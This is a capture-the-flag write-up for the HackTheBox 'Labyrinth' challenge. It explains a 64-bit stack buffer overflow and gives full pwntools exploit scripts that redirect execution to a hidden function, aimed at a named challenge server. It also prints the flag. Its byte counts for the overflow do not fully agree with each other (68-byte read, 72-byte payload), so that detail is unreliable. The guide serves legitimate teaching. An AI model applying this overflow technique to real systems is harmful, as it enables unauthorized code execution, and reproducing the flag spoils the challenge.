# Labyrinth - PWN Challenge Solution Guide
**Difficulty:** Easy | **Points:** 1000  
**Author:** HackTheBox  
**Date Solved:** November 10, 2025

---

## 📚 Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [What You Need to Know](#what-you-need-to-know)
3. [Tools Required](#tools-required)
4. [Understanding the Vulnerability](#understanding-the-vulnerability)
5. [Step-by-Step Solution](#step-by-step-solution)
6. [The Exploit Code](#the-exploit-code)
7. [Key Takeaways](#key-takeaways)
8. [Additional Resources](#additional-resources)

---

## 🎯 Challenge Overview

The Labyrinth challenge is a **buffer overflow exploitation** challenge where you must escape a maze by choosing the correct door. However, the "correct" way to escape isn't by choosing the right door number—it's by exploiting a buffer overflow vulnerability to redirect program execution to a hidden function that prints the flag.

**Challenge Details:**
- **Server:** 94.237.122.72:40031
- **Binary:** `labyrinth` (64-bit ELF executable)
- **Goal:** Exploit buffer overflow to execute the hidden `escape_plan` function

---

## 📖 What You Need to Know

### 1. **What is Buffer Overflow? (Review)**
A buffer overflow occurs when you write more data into a memory buffer than it can hold. The extra data "overflows" into adjacent memory locations, potentially overwriting important data like:
- Saved base pointers
- Return addresses
- Other variables

### 2. **Return Address Overwrite**
When a function finishes executing, it uses the **return address** stored on the stack to know where to continue execution. If we can overwrite this return address with the address of a function we want to call, we can redirect program flow!

**Stack Layout:**
```
Higher Memory Addresses
    ↑
    |
[Return Address] ← We overwrite THIS!
[Saved RBP]      ← Saved base pointer
[Local Variables/Buffer]
    |
    ↓
Lower Memory Addresses
```

### 3. **Stack Alignment in x64**
In 64-bit systems, the stack must be aligned to 16-byte boundaries before calling certain functions (especially those that use SSE instructions). If the stack is misaligned, the program may crash.

**Solution:** Add a `ret` gadget before calling the target function to adjust the stack by 8 bytes.

### 4. **Hidden Functions**
Sometimes binaries contain functions that are never called by the normal program flow but can be executed if you know their address. These are often found using tools like:
- `objdump` - Disassemble binary
- `nm` - List symbols
- `strings` - Extract readable text

---

## 🛠️ Tools Required

### 1. **Python 3 & Pwntools**
Verify installation:
```bash
python3 --version
python3 -c "from pwn import *; print('OK')"
```

### 2. **Binary Analysis Tools**
```bash
file labyrinth          # Check file type
strings labyrinth       # Extract strings
objdump -d labyrinth   # Disassemble
nm labyrinth           # List symbols
```

### 3. **Network Tools**
```bash
nc 94.237.122.72 40031  # Test connection
```

---

## 🔍 Understanding the Vulnerability

### Step 1: Analyze the Binary

```bash
cd /path/to/labyrinth
file labyrinth
```

**Output:**
```
labyrinth: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

This tells us:
- It's a 64-bit Linux executable
- "Not stripped" means debugging symbols are present (easier to analyze)

### Step 2: Find Hidden Functions

```bash
nm labyrinth | grep -E "(escape|main)"
```

**Output:**
```
0000000000401255 T escape_plan    ← Hidden function!
0000000000401405 T main
```

Found it! There's a function called `escape_plan` at address `0x401255` that's never called in normal execution.

### Step 3: Run the Program

```bash
./labyrinth
```

The program shows:
1. A labyrinth ASCII art
2. 100 doors to choose from (001-100)
3. Asks you to select a door

**Testing doors:**
- Most doors immediately fail with "YOU FAILED TO ESCAPE!"
- Door **69** triggers a second prompt: "Would you like to change the door you chose?"

### Step 4: Analyze the Code

Using `objdump`, we find that when you:
1. Select door **69** at the first prompt
2. Enter ANY input at the second prompt

The program calls `fgets()` to read your input:
```c
fgets(buffer, 0x44, stdin);  // Reads 68 bytes
```

But the buffer is only **48 bytes** (0x30)!

**Memory Layout:**
```
rbp-0x30: [48-byte buffer] ← Input goes here
rbp-0x08: [Saved RBP]      ← 8 bytes
rbp+0x00: [Return Address] ← 8 bytes ← We overwrite THIS!
```

**Vulnerability:** Reading 68 bytes into a 48-byte buffer = **20-byte overflow!**
- Overflow bytes 49-56: Overwrite saved RBP
- Overflow bytes 57-64: Overwrite return address

### Step 5: The x64 Stack Alignment Issue

When we tested locally without alignment:
```python
payload = b'A' * 56 + p64(0x401255)  # Direct jump to escape_plan
```
Result: Program crashed or behaved incorrectly!

**Why?** The x64 calling convention requires the stack to be 16-byte aligned before `call` instructions. Our overflow leaves the stack misaligned.

**Solution:** Add a `ret` gadget first:
```python
payload = b'A' * 56 + p64(RET_GADGET) + p64(ESCAPE_PLAN)
```

The `ret` instruction pops 8 bytes from the stack, fixing alignment before jumping to `escape_plan`.

---

## 🚀 Step-by-Step Solution

### Step 1: Find the RET Gadget

```bash
objdump -d labyrinth | grep "ret$" | head -1
```

**Output:**
```
401016:	c3                   	ret
```

We'll use `0x401016` as our RET gadget.

### Step 2: Calculate the Payload

```
Offset  | Content
--------|--------------------
0-47    | 48 bytes of padding (buffer)
48-55   | 8 bytes of padding (saved RBP)
56-63   | RET gadget address (0x401016)
64-71   | escape_plan address (0x401255)
```

**Total payload:** 72 bytes

### Step 3: Test Locally

```python
from pwn import *

p = process('./labyrinth')

# Step 1: Select door 69
p.recvuntil(b'>> ')
p.sendline(b'69')

# Step 2: Send overflow payload
p.recvuntil(b'>> ')
ret_gadget = 0x401016
escape_plan = 0x401255
payload = b'A' * 56 + p64(ret_gadget) + p64(escape_plan)
p.sendline(payload)

# Step 3: Get flag
result = p.recvall()
print(result.decode())
```

**Local Output:**
```
Congratulations on escaping! Here is a sacred spell to help you continue your journey: 
HTB{f4k3_fl4g_4_t35t1ng}
```

✅ **Success!** The exploit works locally.

### Step 4: Exploit the Remote Server

```python
from pwn import *

# Connect to challenge server
r = remote('94.237.122.72', 40031)

# Step 1: Select door 69
r.recvuntil(b'>> ')
r.sendline(b'69')

# Step 2: Send exploit payload
r.recvuntil(b'>> ')
ret_gadget = 0x401016
escape_plan = 0x401255
payload = b'A' * 56 + p64(ret_gadget) + p64(escape_plan)
r.sendline(payload)

# Step 3: Receive flag
result = r.recvall()
print(result.decode())
r.close()
```

**Remote Output:**
```
Congratulations on escaping! Here is a sacred spell to help you continue your journey: 
HTB{3sc4p3_fr0m_4b0v3}
```

🎉 **Flag captured!**

---

## 💻 The Exploit Code

### Final `exploit_labyrinth.py`

```python
#!/usr/bin/python3

'''
Labyrinth Buffer Overflow Exploit
==================================
This exploit uses a buffer overflow vulnerability to redirect execution
to a hidden 'escape_plan' function that prints the flag.

Vulnerability: fgets() reads 68 bytes into a 48-byte buffer at rbp-0x30,
               allowing us to overwrite the return address.

Technique: 
1. Select door 69 to trigger the vulnerable input prompt
2. Send 56 bytes padding + RET gadget + escape_plan address
3. The RET gadget aligns the stack for x64 calling convention
4. Control transfers to escape_plan which prints the flag

Requirements: pwntools (pip3 install pwntools)
Usage: python3 exploit_labyrinth.py
'''

from pwn import *

# ============================================================================
# CONFIGURATION
# ============================================================================

# Target server (change for local testing)
REMOTE = True  # Set to False for local testing

if REMOTE:
    IP = '94.237.122.72'
    PORT = 40031
    r = remote(IP, PORT)
    log.info(f"Connected to {IP}:{PORT}")
else:
    r = process('./labyrinth')
    log.info("Running locally")

# ============================================================================
# EXPLOIT PARAMETERS
# ============================================================================

# Addresses found via binary analysis
RET_GADGET = 0x401016   # Simple 'ret' instruction for stack alignment
ESCAPE_PLAN = 0x401255  # Hidden function that prints the flag

# Buffer layout at rbp-0x30:
# [0-47]   : 48-byte buffer
# [48-55]  : 8-byte saved RBP
# [56-63]  : 8-byte RET gadget address (for alignment)
# [64-71]  : 8-byte escape_plan address (our target)

# ============================================================================
# STEP 1: Select door 69 to trigger second prompt
# ============================================================================

log.info("Waiting for first prompt...")
r.recvuntil(b'>> ')

log.info("Sending door number: 69")
r.sendline(b'69')

# ============================================================================
# STEP 2: Send buffer overflow payload at second prompt
# ============================================================================

log.info("Waiting for second prompt...")
r.recvuntil(b'>> ')

# Construct payload
padding = b'A' * 56  # Fill buffer (48) + saved RBP (8)
ret = p64(RET_GADGET)  # Stack alignment gadget
target = p64(ESCAPE_PLAN)  # Our target function

payload = padding + ret + target

log.info(f"Sending exploit payload ({len(payload)} bytes)")
log.info(f"  - Padding: {len(padding)} bytes")
log.info(f"  - RET gadget: 0x{RET_GADGET:x}")
log.info(f"  - Target: 0x{ESCAPE_PLAN:x}")

r.sendline(payload)

# ============================================================================
# STEP 3: Receive and display the flag
# ============================================================================

log.info("Waiting for response...")
result = r.recvall(timeout=5)
output = result.decode()

print("\n" + "="*70)
print(output)
print("="*70)

# Extract and highlight the flag
if 'HTB{' in output:
    flag_start = output.find('HTB{')
    flag_end = output.find('}', flag_start) + 1
    flag = output[flag_start:flag_end]
    
    success(f"FLAG CAPTURED: {flag}")
else:
    log.error("Flag not found in output!")

# ============================================================================
# CLEANUP
# ============================================================================

r.close()
log.info("Connection closed")
```

### Usage

```bash
# Make executable
chmod +x exploit_labyrinth.py

# Run the exploit
python3 exploit_labyrinth.py
```

---

## 🎓 Key Takeaways

### 1. **Buffer Overflow Basics**
- Overflowing a buffer can overwrite adjacent memory
- Return address overwrite redirects program execution
- Always check buffer sizes vs input sizes

### 2. **x64 Stack Alignment**
- The stack must be 16-byte aligned before certain function calls
- Use a RET gadget to adjust stack alignment by 8 bytes
- Without proper alignment, your exploit may crash

### 3. **Finding Hidden Functions**
```bash
nm binary_name              # List all symbols
objdump -d binary_name      # Disassemble code
strings binary_name         # Extract strings
```

### 4. **Exploit Development Process**
1. **Analyze** the binary (file type, protections, functions)
2. **Find** the vulnerability (overflow, format string, etc.)
3. **Calculate** exact offsets and addresses
4. **Test** locally first
5. **Exploit** the remote target

### 5. **Why Door 69?**
This is often called an "Easter egg" - the developer intentionally made door 69 special. In reverse engineering:
- Test boundary values (0, 1, max, max+1)
- Test "interesting" numbers (42, 69, 1337, etc.)
- Look for patterns in the code

### 6. **Defensive Programming**
To prevent this vulnerability:
```c
// Bad (vulnerable):
fgets(buffer, 68, stdin);  // 68 bytes into 48-byte buffer!

// Good (safe):
fgets(buffer, sizeof(buffer), stdin);  // Respect buffer size
```

---

## 📚 Additional Resources

### Learn More About Buffer Overflows
1. **LiveOverflow Binary Exploitation Series**
   - YouTube playlist covering PWN basics to advanced

2. **Nightmare by guyinatuxedo**
   - https://guyinatuxedo.github.io/
   - Comprehensive PWN training course

3. **PWN College**
   - https://pwn.college/
   - Interactive learning platform

4. **ROP Emporium**
   - https://ropemporium.com/
   - Practice Return-Oriented Programming

### Key Concepts to Study Next
- **ROP (Return-Oriented Programming):** Chain multiple gadgets together
- **NX/DEP Bypass:** Techniques when code execution is disabled
- **ASLR:** Address Space Layout Randomization and bypasses
- **Stack Canaries:** Detection mechanism and bypass techniques
- **Format String Vulnerabilities:** Another common exploit vector

### Practice Platforms
- **HackTheBox:** More PWN challenges
- **PicoCTF:** Beginner-friendly CTF challenges
- **pwnable.kr:** Korean PWN challenges (various difficulties)
- **pwnable.tw:** Advanced PWN challenges

---

## ❓ Common Questions

### Q1: Why do we need the RET gadget?
**A:** In x64 architecture, the stack pointer (RSP) must be 16-byte aligned before calling functions that use SSE instructions (common in modern code). When we overwrite the return address, we jump directly without a proper `call` instruction, which can leave the stack misaligned by 8 bytes. Adding a `ret` gadget pops 8 bytes from the stack, fixing the alignment.

### Q2: How did you find door 69?
**A:** Through systematic testing! When analyzing PWN challenges:
1. Test common special numbers (0, 1, 42, 69, 100, 255, etc.)
2. Look at the code with `objdump` to see if any numbers are compared
3. Use a fuzzing approach - try many inputs quickly

### Q3: What if the binary was stripped?
**A:** If the binary has no symbols (stripped), you can still:
1. Use `objdump -d` to disassemble all code
2. Look for function prologues (`push rbp; mov rbp, rsp`)
3. Analyze strings to identify functions by their output
4. Use tools like `radare2` or `Ghidra` for automated analysis

### Q4: Why does the program still print "YOU FAILED TO ESCAPE"?
**A:** The program prints this message before our overflow takes effect. The buffer overflow only changes where the program goes AFTER the current function returns. So:
1. Program prints "YOU FAILED TO ESCAPE" (normal flow)
2. Function returns
3. Our overwritten return address kicks in
4. Program jumps to `escape_plan`
5. `escape_plan` prints the flag

### Q5: Can this work on modern systems with protections?
**A:** Modern systems have several protections:
- **NX/DEP:** Makes the stack non-executable (doesn't affect us, we're not executing shellcode)
- **ASLR:** Randomizes addresses (this binary doesn't have PIE, so addresses are fixed)
- **Stack Canaries:** Detects buffer overflows (this binary doesn't have canaries)
- **RELRO:** Protects GOT/PLT (doesn't affect our exploit)

This challenge has minimal protections to teach the basics. Real-world exploits are more complex!

---

## 🏆 Challenge Completed!

**Flag:** `HTB{3sc4p3_fr0m_4b0v3}`

**Meaning:** "Escape from above" - a clever hint that the solution isn't to walk through a door (conventional escape), but to exploit the program from a higher level (code execution).

### Challenge Statistics
- **Difficulty:** Easy (but good learning!)
- **Time Spent:** ~1-2 hours (including analysis)
- **Skills Learned:** 
  - Buffer overflow exploitation
  - Return address overwrite
  - x64 stack alignment
  - Binary analysis with objdump/nm
  - pwntools usage

### Next Steps
1. Try other PWN challenges on HackTheBox
2. Learn about ROP chains for more complex exploits
3. Study ASLR bypass techniques
4. Practice with stack canary bypass
5. Explore format string vulnerabilities

---

## 📝 Technical Notes

**Binary Checksec:**
```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

**Vulnerable Code (reconstructed):**
```c
void main() {
    char buffer[48];  // At rbp-0x30
    
    // ... display doors ...
    
    int door = read_door_choice();
    
    if (door == 69) {
        printf("Would you like to change the door you chose?\n>> ");
        fgets(buffer, 0x44, stdin);  // ← VULNERABLE! Reads 68 bytes into 48-byte buffer
    }
    
    // ... rest of code ...
}
```

**Exploit Timeline:**
1. **T0:** Program starts, displays 100 doors
2. **T1:** User selects door 69, triggers second prompt
3. **T2:** User sends 72-byte payload
4. **T3:** fgets() writes 68 bytes (payload is truncated at newline)
5. **T4:** Return address is now `escape_plan` (via RET gadget)
6. **T5:** Function returns, jumps to escape_plan
7. **T6:** escape_plan executes, opens flag.txt, prints flag

---

*Remember: Use these skills ethically and legally. Only practice on authorized systems like HackTheBox!*

**Happy Hacking! 🚀**

---

## Appendix: Quick Reference

### Addresses
- `escape_plan`: 0x401255
- `RET gadget`: 0x401016
- `main`: 0x401405

### Payload Structure
```python
payload = b'A' * 56 + p64(0x401016) + p64(0x401255)
#         |________| |____________| |____________|
#         padding    RET gadget     target function
#         (56 bytes) (8 bytes)      (8 bytes)
```

### Commands Used
```bash
file labyrinth
strings labyrinth
nm labyrinth
objdump -d labyrinth
python3 exploit_labyrinth.py
```
